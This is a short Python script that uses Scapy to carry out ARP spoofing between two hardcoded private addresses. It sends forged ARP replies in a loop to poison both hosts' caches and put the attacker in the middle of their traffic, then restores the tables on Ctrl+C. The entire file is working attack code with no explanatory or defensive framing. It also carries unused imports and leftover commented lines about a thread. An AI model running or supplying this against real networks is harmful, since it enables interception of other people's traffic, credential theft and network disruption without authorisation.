import signal

from scapy.all import *

from scapy.all import *
from scapy.layers.l2 import ARP, getmacbyip
import threading


# create arp spoofing function
def arp_spoof(ip1, ip2):
    target_mac = getmacbyip(ip1)
    pkt = ARP(op=2, pdst=ip1, hwdst=target_mac, psrc=ip2)
    send(pkt, verbose=False)


# create restore function
def restore(destination_ip, source_ip):
    destination_mac = getmacbyip(destination_ip)
    source_mac = getmacbyip(source_ip)
    packet = ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    send(packet, count=20, verbose=False)


# create main function
def arp_pos():
    target1_ip = "192.168.52.128"
    target2_ip = "192.168.52.130"
    try:
        sent_packets_count = 0
        while True:
            arp_spoof(target1_ip, target2_ip)
            arp_spoof(target2_ip, target1_ip)
            sent_packets_count = sent_packets_count + 2
            print("\r[+] Packets sent: " + str(sent_packets_count), end="")
    except KeyboardInterrupt:
        print("\n[-] Detected CTRL + C ..... Resetting ARP tables..... Please wait.\n")
        restore(target1_ip, target2_ip)
        restore(target2_ip, target1_ip)


if __name__ == "__main__":
    arp_pos()

# Set the stop event when the user presses Ctrl+C
# print("Stopping ARP spoofing...")
# arp_thread.join()
# print("ARP spoofing stopped.")
